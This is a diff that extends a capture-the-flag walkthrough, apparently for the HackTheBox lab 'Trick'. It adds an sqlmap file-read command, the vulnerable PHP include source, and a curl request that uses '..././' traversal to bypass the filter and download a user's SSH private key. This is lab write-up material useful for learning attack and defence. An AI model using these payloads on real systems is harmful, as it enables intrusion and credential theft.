@@ -87,6 +87,26 @@ grep 'server_name\|root' /home/blnkn/.local/share/sqlmap/output/preprod-payroll.
 this uncovers a new vhost - preprod-marketing  
 [http://preprod-marketing.trick.htb/index.php](http://preprod-marketing.trick.htb/index.php)  
 because we now have the web folder paths we can now dump the source code  
+```bash
+sqlmap -r save_deductions.req --batch --threads 10 --file-read /var/www/market/index.php  
+```
+```php
+<?php
+$file = $_GET['page'];
 
+if(!isset($file) || ($file=="index.php")) {
+   include("/var/www/market/home.html");
+}
+else{
+        include("/var/www/market/".str_replace("../","",$file));
+}
+?>
+```
+This points us to an LFI as the above can be evaded like this ..././..././..././  
 
 # LFI
+So we can now just dump michael's key, and get user access  
+```
+curl 'http://preprod-marketing.trick.htb/index.php?page=..././..././..././..././..././home/michael/.ssh/id_rsa' -o michael.pem
+```
+
